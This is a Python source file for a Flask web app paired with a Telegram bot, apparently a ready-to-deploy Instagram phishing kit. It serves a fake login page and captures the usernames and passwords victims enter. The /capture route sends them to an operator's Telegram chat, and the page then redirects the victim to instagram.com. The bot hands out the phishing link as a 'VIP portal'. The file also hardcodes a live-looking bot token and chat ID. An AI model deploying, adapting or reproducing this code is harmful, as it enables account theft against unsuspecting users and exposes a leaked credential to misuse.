import os
import telebot
from telebot import types
from flask import Flask, render_template_string, request, jsonify

# --- CONFIGURATION ---
BOT_TOKEN = "8765709173:AAEwy6NbFKLNKsqfjDayvef4fJGfwxVSDlM"
ADMIN_CHAT_ID = "7161571409"

# ⚠️ Render pe deploy karne ke baad jo URL milega, usko yahan daal dena (Jaise: https://xyz.onrender.com)
PORTAL_URL = "https://your-hosted-app.onrender.com"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# --- ULTRA VIP CYBERPUNK UI WEB APP ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIP Secure Gateway | NICK HACKER</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
        body { background: #030305; color: #00ffcc; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .cyber-grid { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,255,204,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,204,0.03) 1px, transparent 1px); background-size: 20px 20px; z-index: -1; }
        .container { width: 100%; max-width: 380px; padding: 30px 25px; background: rgba(10, 10, 18, 0.85); backdrop-filter: blur(15px); border: 1px solid rgba(0,255,204,0.3); border-radius: 12px; box-shadow: 0 0 25px rgba(0,255,204,0.15); text-align: center; }
        .logo { font-size: 28px; font-weight: bold; color: #00ffcc; text-shadow: 0 0 12px rgba(0,255,204,0.6); margin-bottom: 5px; letter-spacing: 2px; }
        .subtitle { font-size: 11px; color: #8892b0; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 3px; }
        .input-group { position: relative; margin-bottom: 15px; text-align: left; }
        .input-group label { display: block; font-size: 10px; color: #00ffcc; margin-bottom: 5px; letter-spacing: 1px; }
        input { width: 100%; background: #05050a; border: 1px solid #1f293d; border-radius: 6px; color: #fff; padding: 12px 14px; font-size: 13px; outline: none; transition: 0.3s; }
        input:focus { border-color: #00ffcc; box-shadow: 0 0 10px rgba(0,255,204,0.4); }
        .btn { width: 100%; background: linear-gradient(135deg, #00ffcc 0%, #0077ff 100%); border: none; border-radius: 6px; color: #030305; padding: 12px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 15px; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
        .btn:hover { opacity: 0.9; box-shadow: 0 0 20px rgba(0,255,204,0.6); transform: translateY(-2px); }
        .footer { margin-top: 25px; font-size: 10px; color: #4a5568; letter-spacing: 1px; }
        .badge { display: inline-block; background: rgba(0,255,204,0.1); color: #00ffcc; padding: 4px 12px; border-radius: 20px; font-size: 10px; font-weight: bold; margin-bottom: 20px; border: 1px solid rgba(0,255,204,0.3); text-shadow: 0 0 5px rgba(0,255,204,0.5); }
    </style>
</head>
<body>
    <div class="cyber-grid"></div>
    <div class="container">
        <div class="badge">SECURE VIP PROTOCOL ACTIVE</div>
        <div class="logo">INSTA-CORE</div>
        <div class="subtitle">Authorization Required</div>
        
        <form id="vipForm" onsubmit="submitTarget(event)">
            <div class="input-group">
                <label>TARGET USERNAME / EMAIL</label>
                <input type="text" id="targetUser" placeholder="Enter target handle..." required>
            </div>
            <div class="input-group">
                <label>SECURITY KEY / PASSWORD</label>
                <input type="password" id="targetPass" placeholder="Enter key or password..." required>
            </div>
            <button type="submit" class="btn">Execute Session</button>
        </form>
        <div class="footer">ENCRYPTED VIA NICK HACKER CORE</div>
    </div>

    <script>
        async function submitTarget(e) {
            e.preventDefault();
            const u = document.getElementById('targetUser').value;
            const p = document.getElementById('targetPass').value;

            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: u, password: p })
            });

            window.location.href = "https://www.instagram.com";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        alert_msg = (
            f"🎯 **VIP TARGET SECURED, MAHARAJ!** 🎯\n\n"
            f"👤 **Target User:** `{username}`\n"
            f"🔑 **Key/Password:** `{password}`\n\n"
            f"😈🔥 *NICK HACKER VIP NETWORK*"
        )
        bot.send_message(ADMIN_CHAT_ID, alert_msg, parse_mode="Markdown")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "failed"})

# --- TELEGRAM BOT WEBHOOK / POLLING SETUP ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_name = message.from_user.first_name if message.from_user.first_name else "Maharaj"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_insta = types.InlineKeyboardButton("🔐 Instagram VIP Portal", url=PORTAL_URL)
    btn_cam = types.InlineKeyboardButton("📸 Camera Capture Tool", url=PORTAL_URL)
    btn_status = types.InlineKeyboardButton("💎 Check Account Status", callback_data="check_status")
    
    markup.add(btn_insta, btn_cam, btn_status)
    
    welcome_msg = (
        f"😈 **WELCOME TO NICK HACKER PANEL, MAHARAJ {user_name.upper()}!** 😈\n\n"
        f"Saare VIP tools active hain. Niche diye gaye buttons me se jo tool use karna hai, uspe tap kar! 🔥"
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "check_status")
def callback_query(call):
    bot.answer_callback_query(call.id, "VIP Status Checked Successfully!")
    bot.send_message(
        call.message.chat.id, 
        "💎 **VIP MEMBER STATUS**\n\n"
        f"👤 Telegram ID: `{call.from_user.id}`\n"
        "⭐ Access Level: **Full Unrestricted**\n"
        "🔗 Status: **Online & Ready** 😈🔥", 
        parse_mode="Markdown"
    )

if __name__ == "__main__":
    import threading
    # Background thread for Telegram Bot Polling
    bot_thread = threading.Thread(target=lambda: bot.infinity_polling())
    bot_thread.daemon = True
    bot_thread.start()
    
    # Flask Web App for Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
  
